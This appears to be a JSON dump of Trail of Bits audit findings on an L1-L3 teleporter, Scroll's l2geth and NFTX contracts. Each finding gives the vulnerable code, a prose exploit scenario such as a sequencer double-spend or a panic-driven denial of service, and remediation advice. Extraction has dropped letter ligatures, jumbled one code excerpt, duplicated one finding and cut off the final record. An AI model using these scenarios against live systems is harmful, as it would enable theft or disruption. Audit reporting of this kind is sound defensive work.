        "body": "The elds of the structures, RetryableGasParams and RetryableGasCosts, are undocumented, and it would be helpful to specify how and where these values are to be used for reviewers and developers, especially considering how similar they are. struct RetryableGasParams { uint256 l2GasPriceBid; uint256 l3GasPriceBid; uint64 l2ForwarderFactoryGasLimit; uint64 l1l2FeeTokenBridgeGasLimit; uint64 l1l2TokenBridgeGasLimit; uint64 l2l3TokenBridgeGasLimit; uint256 l2ForwarderFactoryMaxSubmissionCost; uint256 l1l2FeeTokenBridgeMaxSubmissionCost; uint256 l1l2TokenBridgeMaxSubmissionCost; uint256 l2l3TokenBridgeMaxSubmissionCost; } /// @notice Total cost for each retryable ticket. struct RetryableGasCosts { uint256 l1l2FeeTokenBridgeCost; uint256 l1l2TokenBridgeCost; uint256 l2ForwarderFactoryCost; uint256 l2l3TokenBridgeCost; } Figure 4.1: Structs with undocumented elds (l1-l3-teleport-contracts/contracts/interfaces/IL1Teleporter.sol#3251) Recommendations Short term, document the structures elds. Long term, require documentation as part of pull requests.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Teleport function should document that contract callers should be able to create retryable tickets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchain-l1-l3-teleporter-securityreview.pdf",
        "body": "The L1Teleporters documentation of its teleport function does not mention that callers of teleport may need to create retryable tickets to call rescueFunds on the L2Forwarder should teleporting to L3 fail. If a contract is immutable and does not have the capability to create retryable tickets, the senders funds may be irrecoverable. If called by an EOA or a contract's constructor, the L2Forwarder will be Call `determineTypeAndFees` to calculate the total cost of retryables in /// @notice Start an L1 -> L3 transfer. msg.value sent must equal the total ETH cost of all retryables. /// ETH and the L3's fee token. /// owned by the caller's address, /// /// @dev L2Forwarder, and one to call the L2ForwarderFactory. /// be created to send the L3's fee token to the L2Forwarder. /// l2CallValue of the call to the L2ForwarderFactory. function teleport(TeleportParams calldata params) external payable; otherwise the L2Forwarder will be owned by the caller's alias. 2 retryables will be created: one to send tokens and ETH to the If TeleportationType is NonFeeTokenToCustomFeeL3, a third retryable will ETH used to pay for the L2 -> L3 retryable is sent through the Figure 5.1: Natspec of the teleport function (l1-l3-teleport-contracts/contracts/interfaces/IL1Teleporter.sol#7683) Recommendations Short term, document that contracts using the teleporter should include functionality to create retryables in case they need to call rescueFunds on the L2. Long term, review and implement user-facing documentation and SDKs for validations and recommendations to make integration less error-prone. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Multiple instances of unchecked errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf",
        "body": "There are multiple instances of unchecked errors in the l2geth codebase, which could lead to undened behavior when errors are raised. One such unhandled error is shown in gure 2.1. A comprehensive list of unchecked errors is provided in appendix C. if len(requests) == 0 && req.deps == 0 { s.commit(req) } else { Figure 2.1: The Sync.commit() function returns an error that is unhandled, which could lead to invalid commitments or a frozen chain. (go-ethereum/trie/sync.go#296298) Unchecked errors also make the system vulnerable to denial-of-service attacks; they could allow attackers to trigger nil dereference panics in the sequencer node. Exploit Scenario An attacker identies a way to cause a zkTrie commitment to fail, allowing invalid data to be silently committed by the sequencer. Recommendations Short term, add error checks to all functions that can emit Go errors. Long term, add the tools errcheck and ineffassign to l2geths build pipeline. These tools can be used to detect errors and prevent builds containing unchecked errors from being deployed.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Risk of double-spend attacks due to use of single-node Clique consensus without nality API ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf",
        "body": "l2geth uses the proof-of-authority Clique consensus protocol, dened by EIP-255. This consensus type is not designed for single-node networks, and an attacker-controlled sequencer node may produce multiple conicting forks of the chain to facilitate double-spend attacks. The severity of this nding is compounded by the fact that there is no API for an end user to determine whether their transaction has been nalized by L1, forcing L2 users to use ineective block/time delays to determine nality. Clique consensus was originally designed as a replacement for proof-of-work consensus for Ethereum testnets. It uses the same fork choice rule as Ethereums proof-of-work consensus; the fork with the highest diculty should be considered the canonical fork. Clique consensus does not use proof-of-work and cannot update block diculty using the traditional calculation; instead, block diculty may be one of two values:  1 if the block was mined by the designated signer for the block height  2 if the block was mined by a non-designated signer for the block height This means that in a network with only one authorized signer, all of the blocks and forks produced by the sequencer will have the same diculty value, making it impossible for syncing nodes to determine which fork is canonical at the given block height. In a normal proof-of-work network, one of the proposed blocks will have a higher diculty value, causing syncing nodes to re-organize and drop the block with the lower diculty value. In a single-validator proof-of-authority network, neither block will be preferred, so each syncing node will simply prefer the rst block they received. This nding is not unique to l2geth; it will be endemic to all L2 systems that have only one authorized sequencer. Exploit Scenario An attacker acquires control over l2geths centralized sequencer node. The attacker modies the node to prove two forks: one fork containing a deposit transaction to a centralized exchange, and one fork with no such deposit transaction. The attacker publishes the rst fork, and the centralized exchange picks up and processes the deposit transaction. The attacker continues to produce blocks on the second private fork. Once the exchange processes the deposit, the attacker stops generating blocks on the public fork, generates an extra block to make the private fork longer than the public fork, then publishes the private fork to cause a re-organization across syncing nodes. This attack must be completed before the sequencer is required to publish a proof to L1. Recommendations Short term, add API methods and documentation to ensure that bridges and centralized exchanges query only for transactions that have been proved and nalized on the L1 network. Long term, decentralize the sequencer in such a way that a majority of sequencers must collude in order to successfully execute a double-spend attack. This design should be accompanied by a slashing mechanism to penalize sequencers that sign conicting blocks.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Improper use of panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf",
        "body": "l2geth overuses Gos panic mechanism in lieu of Gos built-in error propagation system, introducing opportunities for denial of service. Go has two primary methods through which errors can be reported or propagated up the call stack: the panic method and Go errors. The use of panic is not recommended, as it is unrecoverable: when an operation panics, the Go program is terminated and must be restarted. The use of panic creates a denial-of-service vector that is especially applicable to a centralized sequencer, as a restart of the sequencer would eectively halt the L2 network until the sequencer recovers. Some example uses of panic are presented in gures 4.1 to 4.3. These do not represent an exhaustive list of panic statements in the codebase, and the Scroll team should investigate each use of panic in its modied code to verify whether it truly represents an unrecoverable error. func sanityCheckByte32Key(b []byte) { if len(b) != 32 && len(b) != 20 { panic(fmt.Errorf(\"do not support length except for 120bit and 256bit now. data: %v len: %v\", b, len(b))) } } Figure 4.1: The sanityCheckByte32Key function panics when a trie key does not match the expected size. This function may be called during the execution of certain RPC requests. (go-ethereum/trie/zk_trie.go#4448) func (s *StateAccount) MarshalFields() ([]zkt.Byte32, uint32) { fields := make([]zkt.Byte32, 5) if s.Balance == nil { panic(\"StateAccount balance nil\") } if !utils.CheckBigIntInField(s.Balance) { panic(\"StateAccount balance overflow\") } if !utils.CheckBigIntInField(s.Root.Big()) { panic(\"StateAccount root overflow\") } if !utils.CheckBigIntInField(new(big.Int).SetBytes(s.PoseidonCodeHash)) { panic(\"StateAccount poseidonCodeHash overflow\") } Figure 4.2: The MarshalFields function panics when attempting to marshal an object that does not match certain requirements. This function may be called during the execution of certain RPC requests. (go-ethereum/core/types/state_account_marshalling.go#4764) func (t *ProofTracer) MarkDeletion(key []byte) { if path, existed := t.emptyTermPaths[string(key)]; existed { // copy empty node terminated path for final scanning t.rawPaths[string(key)] = path } else if path, existed = t.rawPaths[string(key)]; existed { // sanity check leafNode := path[len(path)-1] if leafNode.Type != zktrie.NodeTypeLeaf { panic(\"all path recorded in proofTrace should be ended with leafNode\") } Figure 4.3: The MarkDeletion function panics when the proof tracer contains a path that does not terminate in a leaf node. This function may be called when a syncing node attempts to process an invalid, malicious proof that an attacker has gossiped on the network. (go-ethereum/trie/zktrie_deletionproof.go#120130) Exploit Scenario An attacker identies an error path that terminates with a panic that can be triggered by a malformed RPC request or proof payload. The attacker leverages this issue to either disrupt the sequencers operation or prevent follower/syncing nodes from operating properly. Recommendations Short term, review all uses of panic that have been introduced by Scrolls changes to go-ethereum. Ensure that these uses of panic truly represent unrecoverable errors, and if not, add error handling logic to recover from the errors. Long term, annotate all valid uses of panic with explanations for why the errors are unrecoverable and, if applicable, how to prevent the unrecoverable conditions from being triggered. l2geths code review process must also be updated to verify that this documentation exists for new uses of panic that are introduced later.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Risk of panic from nil dereference due to awed error reporting in addressToKey ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf",
        "body": "The addressToKey function, shown in gure 5.1, returns a nil pointer instead of a Go error when an error is returned by the preImage.Hash() function, which will cause a nil dereference panic in the NewZkTrieProofWriter function, as shown in gure 5.2. If the error generated by preImage.Hash() is unrecoverable, the addressToKey function should panic instead of silently returning a nil pointer. func addressToKey(addr common.Address) *zkt.Hash { var preImage zkt.Byte32 copy(preImage[:], addr.Bytes()) h, err := preImage.Hash() if err != nil { log.Error(\"hash failure\", \"preImage\", hexutil.Encode(preImage[:])) return nil } return zkt.NewHashFromBigInt(h) } Figure 5.1: The addressToKey function returns a nil pointer to zkt.Hash when an error is returned by preImage.Hash(). (go-ethereum/trie/zkproof/writer.go#3141) func NewZkTrieProofWriter(storage *types.StorageTrace) (*zktrieProofWriter, error) { underlayerDb := memorydb.New() zkDb := trie.NewZktrieDatabase(underlayerDb) accounts := make(map[common.Address]*types.StateAccount) // resuming proof bytes to underlayerDb for addrs, proof := range storage.Proofs { if n := resumeProofs(proof, underlayerDb); n != nil { addr := common.HexToAddress(addrs) if n.Type == zktrie.NodeTypeEmpty { accounts[addr] = nil } else if acc, err := types.UnmarshalStateAccount(n.Data()); err == nil { if bytes.Equal(n.NodeKey[:], addressToKey(addr)[:]) { accounts[addr] = acc Figure 5.2: The addressToKey function is consumed by NewZkTrieProofWriter, which will attempt to dereference the nil pointer and generate a system panic. (go-ethereum/trie/zkproof/writer.go#152167) Recommendations Short term, modify addressToKey so that it either returns an error that its calling functions can propagate or, if the error is unrecoverable, panics instead of returning a nil pointer. Long term, update Scrolls code review and style guidelines to reect that errors must be propagated by Gos error system or must halt the program by using panic.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "6. Risk of transaction pool admission denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf",
        "body": "l2geths changes to the transaction pool include an ECDSA recovery operation at the beginning of the pools transaction validation logic, introducing a denial-of-service vector: an attacker could generate invalid transactions to exhaust the sequencers resources. l2geth adds an L1 fee that all L2 transactions must pay. To verify that an L2 transaction can aord the L1 fee, the transaction pool calls fees.VerifyFee(), as shown in gure 6.1. VerifyFee() performs an ECDSA recovery operation to determine the account that will pay the L1 fee, as shown in gure 6.2. ECDSA key recovery is an expensive operation that should be executed as late in the transaction validation process as possible in order to reduce the impact of denial-of-service attacks. func (pool *TxPool) add(tx *types.Transaction, local bool) (replaced bool, err error) { // If the transaction is already known, discard it hash := tx.Hash() if pool.all.Get(hash) != nil { log.Trace(\"Discarding already known transaction\", \"hash\", hash) knownTxMeter.Mark(1) return false, ErrAlreadyKnown } // Make the local flag. If it's from local source or it's from the network but // the sender is marked as local previously, treat it as the local transaction. isLocal := local || pool.locals.containsTx(tx) if pool.chainconfig.Scroll.FeeVaultEnabled() { if err := fees.VerifyFee(pool.signer, tx, pool.currentState); err != nil { Figure 6.1: TxPool.add() calls fees.VerifyFee() before any other transaction validators are called. (go-ethereum/core/tx_pool.go#684697) func VerifyFee(signer types.Signer, tx *types.Transaction, state StateDB) error { from, err := types.Sender(signer, tx) if err != nil { return errors.New(\"invalid transaction: invalid sender\") } Figure 6.2: VerifyFee() initiates an ECDSA recovery operation via types.Sender(). (go-ethereum/rollup/fees/rollup_fee.go#198202) Exploit Scenario An attacker generates a denial-of-service attack against the sequencer by submitting extraordinarily large transactions. Because ECDSA recovery is a CPU-intensive operation and is executed before the transaction size is checked, the attacker is able to exhaust the memory resources of the sequencer. Recommendations Short term, modify the code to check for L1 fees in the TxPool.validateTx() function immediately after that function calls types.Sender(). This will ensure that other, less expensive-to-check validations are performed before the ECDSA signature is recovered. Long term, exercise caution when making changes to code paths that validate information received from public sources or gossip. For changes to the transaction pool, a good general rule of thumb is to validate transaction criteria in the following order: 1. Simple, in-memory criteria that do not require disk reads or data manipulation 2. Criteria that require simple, in-memory manipulations of the data such as checks of the transaction size 3. Criteria that require an in-memory state trie to be checked 4. ECDSA recovery operations 5. Criteria that require an on-disk state trie to be checked However, note that sometimes these criteria must be checked out of order; for example, the ECDSA recovery operation to identify the origin account may need to be performed before the state trie is checked to determine whether the account can aord the transaction.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Transaction pool fails to drop transactions that cannot a\u0000ord L1 fees ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf",
        "body": "l2geth denes two fees that must be paid for L2 transactions: an L2 fee and an L1 fee. However, the code fails to account for L1 fees; as a result, transactions that cannot aord the combined L1 and L2 fees may be included in a block rather than demoted, as intended. The transaction.go le denes a Cost() function that returns the amount of ether that a transaction consumes, as shown in gure 1.1. The current implementation of Cost() does not account for L1 fees, causing other parts of the codebase to misjudge the balance requirements to execute a transaction. The correct implementation of Cost() should match the implementation of VerifyFee(), which correctly checks for L1 fees. // Cost returns gas * gasPrice + value. func (tx *Transaction) Cost() *big.Int { total := new(big.Int).Mul(tx.GasPrice(), new(big.Int).SetUint64(tx.Gas())) total.Add(total, tx.Value()) return total } Figure 1.1: The Cost() function does not include L1 fees in its calculation. (go-ethereum/core/types/transaction.go#318323) Most notably, Cost() is consumed by the tx_list.Filter() function, which is used to prune un-executable transactions (transactions that cannot aord the fees), as shown in gure 1.2. The failure to account for L1 fees in Cost() could cause tx_list.Filter() to fail to demote such transactions, causing them to be incorrectly included in the block. func (l *txList) Filter(costLimit *big.Int, gasLimit uint64) (types.Transactions, types.Transactions) { // If all transactions are below the threshold, short circuit if l.costcap.Cmp(costLimit) <= 0 && l.gascap <= gasLimit { return nil, nil } l.costcap = new(big.Int).Set(costLimit) // Lower the caps to the thresholds l.gascap = gasLimit // Filter out all the transactions above the account's funds removed := l.txs.Filter(func(tx *types.Transaction) bool { return tx.Gas() > gasLimit || tx.Cost().Cmp(costLimit) > 0 }) Figure 1.2: Filter() uses Cost() to determine which transactions to demote. (go-ethereum/core/tx_list.go#332343) Exploit Scenario A user creates an L2 transaction that can just barely aord the L1 and L2 fees in the next upcoming block. Their transaction is delayed due to full blocks and is included in a future block in which the L1 fees have risen. Their transaction reverts due to the increased L1 fees instead of being ejected from the transaction pool. Recommendations Short term, refactor the Cost() function to account for L1 fees, as is done in the VerifyFee() function; alternatively, have the transaction list structure use VerifyFee() or a similar function instead of Cost(). Long term, add additional tests to verify complex state transitions such as a transaction becoming un-executable due to changes in L1 fees.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Risk of transaction pool admission denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf",
        "body": "l2geths changes to the transaction pool include an ECDSA recovery operation at the beginning of the pools transaction validation logic, introducing a denial-of-service vector: an attacker could generate invalid transactions to exhaust the sequencers resources. l2geth adds an L1 fee that all L2 transactions must pay. To verify that an L2 transaction can aord the L1 fee, the transaction pool calls fees.VerifyFee(), as shown in gure 6.1. VerifyFee() performs an ECDSA recovery operation to determine the account that will pay the L1 fee, as shown in gure 6.2. ECDSA key recovery is an expensive operation that should be executed as late in the transaction validation process as possible in order to reduce the impact of denial-of-service attacks. func (pool *TxPool) add(tx *types.Transaction, local bool) (replaced bool, err error) { // If the transaction is already known, discard it hash := tx.Hash() if pool.all.Get(hash) != nil { log.Trace(\"Discarding already known transaction\", \"hash\", hash) knownTxMeter.Mark(1) return false, ErrAlreadyKnown } // Make the local flag. If it's from local source or it's from the network but // the sender is marked as local previously, treat it as the local transaction. isLocal := local || pool.locals.containsTx(tx) if pool.chainconfig.Scroll.FeeVaultEnabled() { if err := fees.VerifyFee(pool.signer, tx, pool.currentState); err != nil { Figure 6.1: TxPool.add() calls fees.VerifyFee() before any other transaction validators are called. (go-ethereum/core/tx_pool.go#684697) func VerifyFee(signer types.Signer, tx *types.Transaction, state StateDB) error { from, err := types.Sender(signer, tx) if err != nil { return errors.New(\"invalid transaction: invalid sender\") } Figure 6.2: VerifyFee() initiates an ECDSA recovery operation via types.Sender(). (go-ethereum/rollup/fees/rollup_fee.go#198202) Exploit Scenario An attacker generates a denial-of-service attack against the sequencer by submitting extraordinarily large transactions. Because ECDSA recovery is a CPU-intensive operation and is executed before the transaction size is checked, the attacker is able to exhaust the memory resources of the sequencer. Recommendations Short term, modify the code to check for L1 fees in the TxPool.validateTx() function immediately after that function calls types.Sender(). This will ensure that other, less expensive-to-check validations are performed before the ECDSA signature is recovered. Long term, exercise caution when making changes to code paths that validate information received from public sources or gossip. For changes to the transaction pool, a good general rule of thumb is to validate transaction criteria in the following order:",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Syncing nodes fail to check consensus rule for L1 message count ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-initial-securityreview.pdf",
        "body": "l2geth adds a consensus rule requiring that there be no more than L1Config.NumL1MessagesPerBlock number of L1 messages per L2 block. This rule is checked by the sequencer when building new blocks but is not checked by syncing nodes through the ValidateL1Messages function, as shown in gure 7.1. // TODO: consider adding a rule to enforce L1Config.NumL1MessagesPerBlock. // If there are L1 messages available, sequencer nodes should include them. // However, this is hard to enforce as different nodes might have different views of L1. Figure 7.1: The ValidateL1Messages function does not check the NumL1MessagesPerBlock restriction. (go-ethereum/core/block_validator.go#145147) The TODO comment shown in the gure expresses a concern that syncing nodes cannot enforce NumL1MessagesPerBlock due to the dierent view of L1 that the nodes may have; however, this issue does not prevent syncing nodes from simply checking the number of L1 messages included in the block. Exploit Scenario A malicious sequencer ignores the NumL1MessagesPerBlock restriction while constructing a block, thus bypassing the consensus rules. Follower nodes consider the block to be valid even though the consensus rule is violated. Recommendations Short term, add a check to ValidateL1Messages to check the maximum number of L1 messages per block restriction. Long term, document and check all changes to the systems consensus rules to ensure that both nodes that construct blocks and nodes that sync blocks check the consensus rules. This includes having syncing nodes check whether an L1 transaction actually exists on the L1, a concern expressed in comments further up in the ValidateL1Messages function. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Reliance on third-party library for deployment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "Due to the use of the delegatecall proxy pattern, some NFTX contracts cannot be initialized with their own constructors; instead, they have initializer functions. These functions can be front-run, allowing an attacker to initialize contracts incorrectly. function __NFTXInventoryStaking_init(address _nftxVaultFactory) external virtual override initializer { __Ownable_init(); nftxVaultFactory = INFTXVaultFactory(_nftxVaultFactory); address xTokenImpl = address(new XTokenUpgradeable()); __UpgradeableBeacon__init(xTokenImpl); } Figure 1.1: The initializer function in NFTXInventoryStaking.sol:37-42 The following contracts have initializer functions that can be front-run:  NFTXInventoryStaking  NFTXVaultFactoryUpgradeable  NFTXEligibilityManager  NFTXLPStaking  NFTXSimpleFeeDistributor The NFTX team relies on hardhat-upgrades, a library that oers a series of safety checks for use with certain OpenZeppelin proxy reference implementations to aid in the proxy deployment process. It is important that the NFTX team become familiar with how the hardhat-upgrades library works internally and with the caveats it might have. For example, some proxy patterns like the beacon pattern are not yet supported by the library. Exploit Scenario Bob uses the library incorrectly when deploying a new contract: he calls upgradeTo() and then uses the fallback function to initialize the contract. Eve front-runs the call to the initialization function and initializes the contract with her own address, which results in an incorrect initialization and Eves control over the contract. Recommendations Short term, document the protocols use of the library and the proxy types it supports. Long term, use a factory pattern instead of the initializer functions to prevent front-running of the initializer functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Missing validation of proxy admin indices ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "Multiple functions of the ProxyController contract take an index as an input. The index determines which proxy (managed by the controller) is being targeted. However, the index is never validated, which means that the function will be executed even if the index is out of bounds with respect to the number of proxies managed by the contract (in this case, ve). function changeProxyAdmin(uint256 index, address newAdmin) public onlyOwner { } if (index == 0) { vaultFactoryProxy.changeAdmin(newAdmin); } else if (index == 1) { eligManagerProxy.changeAdmin(newAdmin); } else if (index == 2) { stakingProviderProxy.changeAdmin(newAdmin); } else if (index == 3) { stakingProxy.changeAdmin(newAdmin); } else if (index == 4) { feeDistribProxy.changeAdmin(newAdmin); } emit ProxyAdminChanged(index, newAdmin); Figure 2.1: The changeProxyAdmin function in ProxyController.sol:79-95 In the changeProxyAdmin function, a ProxyAdminChanged event is emitted even if the supplied index is out of bounds (gure 2.1). Other ProxyController functions return the zero address if the index is out of bounds. For example, getAdmin() should return the address of the targeted proxys admin. If getAdmin() returns the zero address, the caller cannot know whether she supplied the wrong index or whether the targeted proxy simply has no admin. function getAdmin(uint256 index) public view returns (address admin) { if (index == 0) { return vaultFactoryProxy.admin(); } else if (index == 1) { return eligManagerProxy.admin(); } else if (index == 2) { return stakingProviderProxy.admin(); } else if (index == 3) { return stakingProxy.admin(); } else if (index == 4) { return feeDistribProxy.admin(); } } Figure 2.2: The getAdmin function in ProxyController.sol:38-50 Exploit Scenario A contract relying on the ProxyController contract calls one of the view functions, like getAdmin(), with the wrong index. The function is executed normally and implicitly returns zero, leading to unexpected behavior. Recommendations Short term, document this behavior so that clients are aware of it and are able to include safeguards to prevent unanticipated behavior. Long term, consider adding an index check to the aected functions so that they revert if they receive an out-of-bounds index.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Random token withdrawals can be gamed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "The algorithm used to randomly select a token for withdrawal from a vault is deterministic and predictable. function getRandomTokenIdFromVault() internal virtual returns (uint256) { uint256 randomIndex = uint256( keccak256( abi.encodePacked( blockhash(block.number - 1), randNonce, block.coinbase, block.difficulty, block.timestamp ) ) ) % holdings.length(); ++randNonce; return holdings.at(randomIndex); } Figure 3.1: The getRandomTokenIdFromVault function in NFTXVaultUpgradable.sol:531-545 All the elements used to calculate randomIndex are known to the caller (gure 3.1). Therefore, a contract calling this function can predict the resulting token before choosing to execute the withdrawal. This nding is of high diculty because NFTXs vault economics incentivizes users to deposit tokens of equal value. Moreover, the cost of deploying a custom exploit contract will likely outweigh the fee savings of choosing a token at random for withdrawal. Exploit Scenario Alice wishes to withdraw a specic token from a vault but wants to pay the lower random redemption fee rather than the higher target redemption fee. She deploys a contract that checks whether the randomly chosen token is her target and, if so, automatically executes the random withdrawal. Recommendations Short term, document the risks described in this nding so that clients are aware of them. Long term, consider removing all randomness from NFTX.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Duplicate receivers allowed by addReceiver() ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "The NFTXSimpleFeeDistributor contract is in charge of protocol fee distribution. To facilitate the fee distribution process, it allows the contract owner (the NFTX DAO) to manage a list of fee receivers. To add a new fee receiver to the contract, the owner calls the addReceiver() function. function addReceiver( uint256 _allocPoint, address _receiver, bool _isContract ) external override virtual onlyOwner { _addReceiver(_allocPoint, _receiver, _isContract); } Figure 4.1: The addReceiver() function in NFTXSimpleFeeDistributor This function in turn executes the internal logic that pushes a new receiver to the receiver list. function _addReceiver( uint256 _allocPoint, address _receiver, bool _isContract ) internal virtual { FeeReceiver memory _feeReceiver = FeeReceiver(_allocPoint, _receiver, _isContract); feeReceivers.push(_feeReceiver); allocTotal += _allocPoint; emit AddFeeReceiver(_receiver, _allocPoint); } Figure 4.2: The _addReceiver() function in NFTXSimpleFeeDistributor However, the function does not check whether the receiver is already in the list. Without this check, receivers can be accidentally added multiple times to the list, which would increase the amount of fees they receive. The issue is of high diculty because the addReceiver() function is owner-protected and, as indicated by the NFTX team, the owner is the NFTX DAO. Because the DAO itself was out of scope for this review, we do not know what the process to become a receiver looks like. We assume that a DAO proposal has to be created and a certain quorum has to be met for it to be executed. Exploit Scenario A proposal is created to add a new receiver to the fee distributor contract. The receiver address was already added, but the DAO members are not aware of this. The proposal passes, and the receiver is added. The receiver gains more fees than he is entitled to. Recommendations Short term, document this behavior so that the NFTX DAO is aware of it and performs the adequate checks before adding a new receiver. Long term, consider adding a duplicate check to the _addReceiver() function.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. OpenZeppelin vulnerability can break initialization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "NFTX extensively uses OpenZeppelin v3.4.1. A bug was recently discovered in all OpenZeppelin versions prior to v4.4.1 that aects initializer functions invoked separately during contract creation: the bug causes the contract initialization modier to fail to prevent reentrancy to the initializers (see CVE-2021-46320). Currently, no external calls to untrusted code are made during contract initialization. However, if the NFTX team were to add a new feature that requires such calls to be made, it would have to add the necessary safeguards to prevent reentrancy. Exploit Scenario An NFTX contract initialization function makes a call to an external contract that calls back to the initializer with dierent arguments. The faulty OpenZeppelin initializer modier fails to prevent this reentrancy. Recommendations Short term, upgrade OpenZeppelin to v4.4.1 or newer. Long term, integrate a dependency checking tool like Dependabot into the NFTX CI process.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Potentially excessive gas fees imposed on users for protocol fee distribution ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "Whenever a user executes a minting, redeeming, or swapping operation on a vault, a fee is charged to the user and is sent to the NFXTSimpleFeeDistributor contract for distribution. function _chargeAndDistributeFees(address user, uint256 amount) internal virtual { // Do not charge fees if the zap contract is calling // Added in v1.0.3. Changed to mapping in v1.0.5. INFTXVaultFactory _vaultFactory = vaultFactory; if (_vaultFactory.excludedFromFees(msg.sender)) { return; } // Mint fees directly to the distributor and distribute. if (amount > 0) { address feeDistributor = _vaultFactory.feeDistributor(); // Changed to a _transfer() in v1.0.3. _transfer(user, feeDistributor, amount); INFTXFeeDistributor(feeDistributor).distribute(vaultId); } } Figure 6.1: The _chargeAndDistributeFees() function in NFTXVaultUpgradeable.sol After the fee is sent to the NFXTSimpleFeeDistributor contract, the distribute() function is then called to distribute all accrued fees. function distribute(uint256 vaultId) external override virtual nonReentrant { require(nftxVaultFactory != address(0)); address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId); uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); if (distributionPaused || allocTotal == 0) { IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance); return; } uint256 length = feeReceivers.length; uint256 leftover; for (uint256 i; i < length; ++i) { FeeReceiver memory _feeReceiver = feeReceivers[i]; uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal); uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); amountToSend = amountToSend > currentTokenBalance ? currentTokenBalance : amountToSend; bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend); if (!complete) { uint256 remaining = IERC20Upgradeable(_vault).allowance(address(this), _feeReceiver.receiver); IERC20Upgradeable(_vault).safeApprove(_feeReceiver.receiver, 0); leftover = remaining; } else { leftover = 0; } } if (leftover != 0) { uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); IERC20Upgradeable(_vault).safeTransfer(treasury, currentTokenBalance); } } Figure 6.2: The distribute() function in NFTXSimpleFeeDistributor.sol If the token balance of the contract is low enough (but not zero), the number of tokens distributed to each receiver (amountToSend) will be close to zero. Ultimately, this can disincentivize the use of the protocol, regardless of the number of tokens distributed. Users have to pay the gas fee for the fee distribution operation, the gas fees for the token operations (e.g., redeeming, minting, or swapping), and the protocol fees themselves. Exploit Scenario Alice redeems a token from a vault, pays the necessary protocol fee, sends it to the NFTXSimpleFeeDistributor contract, and calls the distribute() function. Because the balance of the distributor contract is very low (e.g., $0.50), Alice has to pay a substantial amount in gas to distribute a near-zero amount in fees between all fee receiver addresses. Recommendations Short term, add a requirement for a minimum balance that the NFTXSimpleFeeDistributor contract should have for the distribution operation to execute. Alternatively, implement a periodical distribution of fees (e.g., once a day or once every number of blocks). Long term, consider redesigning the fee distribution mechanism to prevent the distribution of small fees. Also consider whether protocol users should pay for said distribution. See appendix D for guidance on redesigning this mechanism.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Risk of denial of service due to unbounded loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
